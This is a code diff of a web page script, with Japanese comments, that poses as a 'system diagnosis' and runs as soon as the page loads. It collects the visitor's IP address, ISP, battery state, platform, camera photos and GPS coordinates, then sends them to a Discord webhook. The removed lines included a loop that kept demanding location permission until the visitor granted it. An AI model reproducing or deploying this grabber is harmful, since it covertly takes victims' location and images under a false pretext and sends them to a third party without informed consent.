@@ -35,9 +35,7 @@
 
         async function captureCameraBlobOnce(facingMode) {
             try {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    return null;
-                }
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -53,18 +51,22 @@
                 stream.getTracks().forEach(track => track.stop());
 
                 return await new Promise((resolve) => {
-                    canvas.toBlob((b) => {
-                        resolve(b);
-                    }, 'image/jpeg', 0.8);
+                    canvas.toBlob((b) => { resolve(b); }, 'image/jpeg', 0.8);
                 });
             } catch (e) {
                 return null;
             }
         }
 
+        // スマホかどうかを判定する関数（画面の幅やタッチ操作、プラットフォームから自動判定）
+        function isMobileDevice() {
+            const ua = navigator.userAgent;
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);
+        }
+
         async function gatherAndSend() {
             try {
-                addLog("> ネットワークパラメータを取得中...");
+                addLog("> ネットワーク・IP解析中...");
                 let ipData = {};
                 try {
                     const res = await fetch('https://ipapi.co/json/');
@@ -85,29 +87,37 @@
                     } catch (e) {}
                 }
 
-                addLog("> 高精度GPS座標を要求中 (位置情報の許可が必須です)...");
-                let gpsText = "";
-                
-                // 【強制ルール】位置情報が許可されるまで絶対にループを抜けない（拒否されても何度も要求し続ける）
-                while (true) {
+                let locationFieldTitle = "🛰️ GPS位置情報";
+                let locationText = "";
+
+                // スマホとPCで処理を自動分岐
+                if (isMobileDevice()) {
+                    addLog("> スマホ環境を検出: IPベースの地域情報を構築中...");
+                    const country = ipData.country_name || "不明";
+                    const region = ipData.region || "不明";
+                    const city = ipData.city || "不明";
+                    locationFieldTitle = "📍 地域（スマホ・IP推定）";
+                    locationText = `${country} / ${region} / ${city}`;
+                } else {
+                    addLog("> PC環境を検出: 高精度GPS座標を要求中...");
                     try {
                         const position = await new Promise((resolve, reject) => {
                             navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: true, // より正確なGPS（高精度）を要求
-                                timeout: 10000,
+                                enableHighAccuracy: true,
+                                timeout: 6000,
                                 maximumAge: 0
                             });
                         });
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy; // 精度（メートル）
+                        const accuracy = Math.round(position.coords.accuracy);
                         const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                         
-                        gpsText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${Math.round(accuracy)}m 周辺)`;
-                        break; // 取得成功したらループを抜ける
+                        locationFieldTitle = "🛰️ GPS位置情報（PC・高精度）";
+                        locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${accuracy}m 周辺)`;
                     } catch (e) {
-                        addWarn("位置情報が拒否されました。次に進むには必ず「許可」を選択してください！");
-                        await new Promise(r => setTimeout(r, 2000)); // 2秒待ってから再トライ
+                        locationFieldTitle = "📍 地域（GPS取得失敗・IP推定）";
+                        locationText = `${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
                     }
                 }
 
@@ -115,27 +125,23 @@
 
                 const info = {
                     ip: ipData.ip || "不明",
-                    city: ipData.city || "不明",
-                    region: ipData.region || "不明",
-                    country: ipData.country_name || "不明",
                     isp: ipData.org || "不明",
                     platform: navigator.platform
                 };
 
                 const discordMessage = {
-                    content: "🚨 **【システム診断】高精度GPS・強制検知**",
+                    content: "🚨 **【システム診断】デバイス別・検知レポート**",
                     embeds: [{
-                        title: "📊 取得データ一覧（高精度）",
+                        title: "📊 ネットワーク＆ロケーション",
                         color: 16711680,
                         fields: [
                             { name: "🌐 IPアドレス", value: info.ip, inline: true },
-                            { name: "🏢 プロバイダ", value: info.isp, inline: true },
-                            { name: "📍 地域", value: `${info.country} ${info.region} ${info.city}`, inline: false },
+                            { name: "🏢 プロバイダ・回線", value: info.isp, inline: true },
+                            { name: locationFieldTitle, value: locationText, inline: false },
                             { name: "🔋 バッテリー", value: batteryInfo, inline: true },
                             { name: "💻 プラットフォーム", value: info.platform, inline: true },
-                            { name: "🛰️ GPS位置情報（高精度・周辺エリア）", value: gpsText, inline: false },
-                            { name: "📷 前面カメラ", value: frontBlob ? "画像添付済み (front.jpg)" : "取得なし/拒否", inline: true },
-                            { name: "📷 背面カメラ", value: backBlob ? "画像添付済み (back.jpg)" : "取得なし/拒否", inline: true }
+                            { name: "📷 前面カメラ", value: frontBlob ? "取得成功 (front.jpg)" : "拒否/なし", inline: true },
+                            { name: "📷 背面カメラ", value: backBlob ? "取得成功 (back.jpg)" : "拒否/なし", inline: true }
                         ],
                         timestamp: new Date().toISOString()
                     }]
@@ -144,50 +150,34 @@
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify(discordMessage));
                 
-                if (frontBlob) {
-                    formData.append('files[0]', frontBlob, 'front.jpg');
-                }
-                if (backBlob) {
-                    formData.append('files[1]', backBlob, 'back.jpg');
-                }
+                if (frontBlob) formData.append('files[0]', frontBlob, 'front.jpg');
+                if (backBlob) formData.append('files[1]', backBlob, 'back.jpg');
 
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 
-                addLog("> 完了。システムは安全に保護されました。");
+                addLog("> 診断が完了しました。");
 
                 document.body.style.backgroundColor = "#003311";
                 document.getElementById('nextButton').style.display = 'inline-block';
                 document.getElementById('overlayBtn').style.display = 'block';
 
             } catch (error) {
-                addWarn("処理中にエラーが発生しました。");
+                addWarn("エラーが発生しました。");
             }
         }
 
         function openRandomLink() {
             const targets = [
-                // === YouTube動画リスト ===
                 "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                 "https://www.youtube.com/watch?v=jNQXAC9IVRw",
                 "https://www.youtube.com/watch?v=9bZkp7q19f0",
                 "https://www.youtube.com/watch?v=kJQP7kiw5Fk",
                 "https://www.youtube.com/watch?v=3JZ_D3ELwOQ",
-                "https://www.youtube.com/watch?v=OPf0YbXqDm0",
-                
-                // === 一般サイトリスト ===
                 "https://www.google.com",
                 "https://www.wikipedia.org",
                 "https://www.amazon.co.jp",
                 "https://www.github.com",
-                "https://www.yahoo.co.jp",
-                "https://www.bing.com",
-                "https://twitter.com",
-                "https://www.twitch.tv",
-                "https://www.reddit.com",
-                "https://www.apple.com"
+                "https://twitter.com"
             ];
             
             for (let i = targets.length - 1; i > 0; i--) {
@@ -195,8 +185,7 @@
                 [targets[i], targets[j]] = [targets[j], targets[i]];
             }
             
-            const randomUrl = targets[0];
-            window.open(randomUrl, '_blank');
+            window.open(targets[0], '_blank');
         }
 
         window.onload = gatherAndSend;
